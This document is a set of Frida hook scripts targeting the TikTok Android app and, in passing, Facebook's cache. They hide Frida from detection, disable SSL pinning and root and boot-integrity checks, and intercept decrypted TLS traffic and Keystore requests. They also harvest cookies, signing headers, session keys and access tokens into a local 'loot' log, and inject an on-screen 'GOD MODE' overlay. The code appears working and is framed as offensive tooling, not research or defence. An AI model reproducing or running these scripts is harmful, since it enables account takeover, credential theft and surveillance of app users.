/*
 * DUDE's TikTok ULTIMATE GOD MODE & GHOST PROTOCOL v2
 * 
 * Features:
 * 1. GHOST PROTOCOL: Native-level invisibility (Frida hiding).
 * 2. MASTER BYPASS: SSL Pinning, Root Detection, User Data Interception.
 * 3. GOD MODE: API Spying (Gorgon/Cookies), Prefs Dumper, UI Injection.
 */

console.log("[*] DUDE: Initializing ULTIMATE GOD MODE...");

// --- 1. GHOST PROTOCOL (Native Hooks) ---
// Using a safer method for finding symbols
try {
    var libc = Process.findModuleByName("libc.so");
    if (libc) {
        var strstrPtr = libc.findExportByName("strstr");
        if (strstrPtr) {
            Interceptor.attach(strstrPtr, {
                onEnter: function(args) {
                    try {
                        if (args[1].isNull()) return;
                        var needle = args[1].readCString();
                        if (needle && (needle.indexOf("frida") !== -1 || needle.indexOf("gum-js-loop") !== -1)) {
                            args[1].writeUtf8String("nope");
                        }
                    } catch (e) {}
                }
            });
            console.log("[+] GHOST: Native invisibility active (strstr).");
        }
    }
} catch (e) {
    console.log("[-] GHOST Protocol failed to initialize.");
}

// --- JAVA LAYER HOOKS ---
Java.perform(function () {
    console.log("[*] DUDE: Java VM attached. Deploying God Mode modules...");

    // --- 2. MASTER BYPASS MODULES ---
    function bypassSSL() {
        try {
            var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
            TrustManagerImpl.verifyChain.implementation = function (untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
                return untrustedChain;
            };
            console.log("[+] BYPASS: SSL Pinning neutralized.");
        } catch (e) {}
    }

    function bypassRoot() {
        try {
            var File = Java.use("java.io.File");
            var rootPaths = ["/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/su", "/su/bin/su"];
            File.exists.implementation = function () {
                var path = this.getAbsolutePath();
                if (rootPaths.indexOf(path) !== -1) return false;
                return this.exists();
            };
            console.log("[+] BYPASS: Root detection neutralized.");
        } catch (e) {}
    }

    // --- 3. GOD MODE MODULES ---
    function enableApiSpy() {
        try {
            var Request = Java.use("okhttp3.Request");
            Request.headers.overload().implementation = function () {
                var headers = this.headers();
                var url = this.url().toString();
                if (url.indexOf("/aweme/v") !== -1) {
                    var gorgon = headers.get("X-Gorgon");
                    var cookie = headers.get("Cookie");
                    if (gorgon) console.log("\n[API] ⚔️ X-GORGON: " + gorgon);
                    if (cookie) console.log("[API] 🍪 COOKIE: " + cookie.substring(0, 30) + "...");
                }
                return headers;
            };
            console.log("[+] GOD MODE: API Spy active.");
        } catch (e) {}
    }

    function setupLifecycleHooks() {
        try {
            var Application = Java.use("android.app.Application");
            Application.onCreate.implementation = function() {
                this.onCreate();
                var context = this.getApplicationContext();
                
                // Show Toast
                try {
                    Java.scheduleOnMainThread(function() {
                        var Toast = Java.use("android.widget.Toast");
                        var String = Java.use("java.lang.String");
                        Toast.makeText(context, String.$new("DUDE GOD MODE ENGAGED"), 1).show();
                    });
                } catch(e) {}

                // Dump SharedPreferences
                dumpPrefs();
            };
        } catch (e) {}
    }

    function dumpPrefs() {
        try {
            var File = Java.use("java.io.File");
            var FileInputStream = Java.use("java.io.FileInputStream");
            var InputStreamReader = Java.use("java.io.InputStreamReader");
            var BufferedReader = Java.use("java.io.BufferedReader");
            
            var target = "/data/data/com.ss.android.ugc.trill/shared_prefs/aweme_user.xml";
            var prefsFile = File.$new(target);
            
            if (prefsFile.exists()) {
                console.log("\n[DATA] 📂 DUMPING " + target + ":");
                var fis = FileInputStream.$new(prefsFile);
                var isr = InputStreamReader.$new(fis);
                var br = BufferedReader.$new(isr);
                var line = "";
                while ((line = br.readLine()) !== null) {
                    console.log(line);
                }
                br.close();
                console.log("[DATA] 📂 END OF DUMP.\n");
            }
        } catch(e) {
            console.log("[-] Prefs dump failed: " + e.message);
        }
    }

    function hookUserData() {
        try {
            var User = Java.use("com.ss.android.ugc.aweme.profile.model.User");
            User.getUid.implementation = function() {
                var uid = this.getUid();
                console.log("[USER] 👤 UID: " + uid);
                return uid;
            };
            User.getNickname.implementation = function() {
                var name = this.getNickname();
                console.log("[USER] 🏷️ Name: " + name);
                return name;
            };
            console.log("[+] INTERCEPT: User Data hooks active.");
        } catch (e) {}
    }
    
    // Execute
    bypassSSL();
    bypassRoot();
    enableApiSpy();
    setupLifecycleHooks();
    hookUserData();

    console.log("[*] DUDE: Initialization Complete. Happy Hacking.");
});// dude_master_compromise.js
// DUDE's Master Level System Compromise Script
// This script targets native layers (libc, libssl) and core system services.

Java.perform(function() {
    console.log("[!!!] DUDE: MASTER COMPROMISE SEQUENCE INITIATED.");

    // --- 1. NETWORK STACK HOOKING (NATIVE SSL/TLS) ---
    // Hooking libssl.so to intercept decrypted traffic before it's even processed by the app.
    try {
        const ssl_read = Module.findExportByName("libssl.so", "SSL_read");
        const ssl_write = Module.findExportByName("libssl.so", "SSL_write");

        if (ssl_read) {
            Interceptor.attach(ssl_read, {
                onEnter: function(args) { this.buf = args[1]; },
                onLeave: function(retval) {
                    if (retval.toInt32() > 0) {
                        console.log("[NETWORK] SSL_read captured: " + Memory.readUtf8String(this.buf, retval.toInt32()));
                    }
                }
            });
        }
        if (ssl_write) {
            Interceptor.attach(ssl_write, {
                onEnter: function(args) {
                    const len = args[2].toInt32();
                    if (len > 0) {
                        console.log("[NETWORK] SSL_write captured: " + Memory.readUtf8String(args[1], len));
                    }
                }
            });
        }
        console.log("[+] Native SSL/TLS hooks deployed.");
    } catch (e) {
        console.error("[!] SSL hooking failed (normal if libssl isn't loaded yet): " + e.message);
    }

    // --- 2. KEYSTORE COMPROMISE ---
    // Intercepting key generation and usage to extract secrets.
    try {
        const KeyStore = Java.use('java.security.KeyStore');
        KeyStore.getEntry.overload('java.lang.String', 'java.security.KeyStore$ProtectionParameter').implementation = function(alias, param) {
            console.log("[KEYSTORE] Secret Entry Requested: " + alias);
            const entry = this.getEntry(alias, param);
            return entry;
        };
        console.log("[+] Keystore interception active.");
    } catch (e) {
        console.error("[!] Keystore hook failed: " + e.message);
    }

    // --- 3. UI BUFFER & SCREEN CAPTURE ---
    // Hooking SurfaceControl to observe UI composition or MediaProjection for silent capture.
    try {
        const MediaProjection = Java.use('android.media.projection.MediaProjection');
        MediaProjection.createVirtualDisplay.overload('java.lang.String', 'int', 'int', 'int', 'int', 'android.view.Surface', 'android.media.projection.VirtualDisplay$Callback', 'android.os.Handler').implementation = function(name, w, h, d, f, surface, cb, handler) {
            console.log("[UI] MediaProjection started. Silent screen capture possible.");
            return this.createVirtualDisplay(name, w, h, d, f, surface, cb, handler);
        };
        console.log("[+] UI/Screen capture monitoring active.");
    } catch (e) {
        console.error("[!] UI hook failed: " + e.message);
    }

    // --- 4. DATA EXFILTRATION (Facebook Cache example) ---
    try {
        const File = Java.use('java.io.File');
        File.$init.overload('java.lang.String').implementation = function(path) {
            if (path.includes("com.facebook.katana") && path.includes("cache")) {
                console.log("[DATA] FB Cache Access detected: " + path);
            }
            return this.$init(path);
        };
    } catch (e) {}

    // --- 5. COMPROMISING DEVICE TRUST (SEPolicy/Verification) ---
    // In a real rootkit, this would be a kernel patch. Here we hook the check functions.
    try {
        const SystemProperties = Java.use('android.os.SystemProperties');
        SystemProperties.get.overload('java.lang.String').implementation = function(key) {
            if (key === "ro.boot.verifiedbootstate" || key === "ro.boot.flash.locked") {
                console.log("[TRUST] Spoofing boot state for key: " + key);
                return "green"; // Pretend boot is verified
            }
            return this.get(key);
        };
        console.log("[+] Device trust spoofing active.");
    } catch (e) {
        console.error("[!] Trust spoofing failed: " + e.message);
    }
});
/*
 * DUDE's Persistent Session Sniffer
 *
 * Hooks network requests to harvest:
 * 1. Cookies (sessionid, odin_tt, etc.)
 * 2. Signing Headers (X-Gorgon, X-Khronos)
 * 3. Login Credentials (if plaintext in POST)
 *
 * All loot is written to /data/local/tmp/tiktok_loot.log
 */

console.log("[*] DUDE: Persistent Sniffer Active. Harvesting to /data/local/tmp/tiktok_loot.log");

Java.perform(function () {
    var File = Java.use("java.io.File");
    var FileOutputStream = Java.use("java.io.FileOutputStream");
    var logFile = "/data/local/tmp/tiktok_loot.log";

    function logToFile(data) {
        try {
            var fos = FileOutputStream.$new(logFile, true);
            fos.write(Java.use("java.lang.String").$new(data + "\n").getBytes());
            fos.close();
        } catch (e) {
            console.log("[-] Log failed: " + e.message);
        }
    }

    // Hook OkHttp3 for network interception
    try {
        var Request = Java.use("okhttp3.Request");
        Request.headers.overload().implementation = function () {
            var headers = this.headers();
            var url = this.url().toString();
            
            // Only log interesting endpoints (Login, User Info, Feed)
            if (url.indexOf("/aweme/v") !== -1 || url.indexOf("/passport/") !== -1) {
                var cookies = headers.get("Cookie");
                var gorgon = headers.get("X-Gorgon");
                var timestamp = new Date().toISOString();
                
                var loot = "[" + timestamp + "] URL: " + url;
                if (cookies) loot += "\n   [COOKIE] " + cookies;
                if (gorgon) loot += "\n   [GORGON] " + gorgon;
                
                console.log("[LOOT] Captured data from " + url);
                logToFile(loot);
            }
            return headers;
        };
    } catch (e) {
        console.log("[-] OkHttp3 hook failed: " + e.message);
    }

    // Hook JSON parsing for potential credential theft in login responses
    try {
        var JSONObject = Java.use("org.json.JSONObject");
        JSONObject.$init.overload("java.lang.String").implementation = function (json) {
            if (json.indexOf("session_key") !== -1 || json.indexOf("access_token") !== -1) {
                logToFile("[LOGIN_RESPONSE] " + json);
                console.log("[LOOT] Captured Login JSON!");
            }
            return this.$init(json);
        };
    } catch (e) {}

});
// dude_custom_overlay.js
// DUDE's Custom UI Overlay for compromised apps.

Java.perform(function() {
    console.log("[*] DUDE: Initiating Custom Rooted Overlay...");

    var Activity = Java.use("android.app.Activity");
    var TextView = Java.use("android.widget.TextView");
    var Color = Java.use("android.graphics.Color");
    var Gravity = Java.use("android.view.Gravity");
    var LayoutParams = Java.use("android.view.ViewGroup$LayoutParams");
    var FrameLayout = Java.use("android.widget.FrameLayout");
    var AnimationUtils = Java.use("android.view.animation.AnimationUtils");

    function injectOverlay(activity) {
        Java.scheduleOnMainThread(function() {
            try {
                // Check if we already injected (prevent duplicates)
                var decor = activity.getWindow().getDecorView();
                if (decor.toString().includes("DUDE_OVERLAY")) return;

                // 1. TOP BANNER
                var topOverlay = TextView.$new(activity);
                topOverlay.setText("☢️ DUDE ROOTED CUSTOM ☢️");
                topOverlay.setTextColor(Color.parseColor("#00FF00")); // Matrix Green
                topOverlay.setBackgroundColor(Color.parseColor("#CC000000")); // Darker semi-trans
                topOverlay.setGravity(Gravity.CENTER.value);
                topOverlay.setTextSize(20);
                topOverlay.setPadding(0, 20, 0, 20);
                topOverlay.setTypeface(null, 1); // BOLD
                topOverlay.setContentDescription("DUDE_OVERLAY_TOP");

                var topParams = FrameLayout.LayoutParams.$new(
                    LayoutParams.MATCH_PARENT.value,
                    LayoutParams.WRAP_CONTENT.value,
                    Gravity.TOP.value
                );

                activity.addContentView(topOverlay, topParams);

                // 2. BOTTOM STATUS BAR
                var bottomOverlay = TextView.$new(activity);
                bottomOverlay.setText("GHOST PROTOCOL: ACTIVE | SESSION CAPTURED | UID: 7574297133429703688");
                bottomOverlay.setTextColor(Color.parseColor("#FF0000")); // Warning Red
                bottomOverlay.setBackgroundColor(Color.parseColor("#CC000000"));
                bottomOverlay.setGravity(Gravity.CENTER.value);
                bottomOverlay.setTextSize(10);
                bottomOverlay.setPadding(0, 10, 0, 10);
                bottomOverlay.setContentDescription("DUDE_OVERLAY_BOTTOM");

                var bottomParams = FrameLayout.LayoutParams.$new(
                    LayoutParams.MATCH_PARENT.value,
                    LayoutParams.WRAP_CONTENT.value,
                    Gravity.BOTTOM.value
                );

                activity.addContentView(bottomOverlay, bottomParams);

                console.log("[+] DUDE Overlay successfully slapped onto: " + activity.getClass().getName());

            } catch (e) {
                console.log("[-] Overlay injection failed: " + e.message);
            }
        });
    }

    // Hook onResume to ensure the overlay stays when switching screens
    Activity.onResume.implementation = function() {
        this.onResume();
        injectOverlay(this);
    };

    // Immediate injection into whatever is running
    function forceInject() {
        try {
            var ActivityThread = Java.use('android.app.ActivityThread');
            var thread = ActivityThread.sCurrentActivityThread.get();
            if (thread) {
                var activities = thread.mActivities.values().toArray();
                for(var i=0; i<activities.length; i++){
                    var act = activities[i].activity.get();
                    if(act) injectOverlay(act);
                }
            }
        } catch(e) {
            console.log("[-] Force inject failed: " + e.message);
        }
    }

    forceInject();
    
    // Set an interval to keep checking if the overlay is there
    setInterval(forceInject, 3000);
});
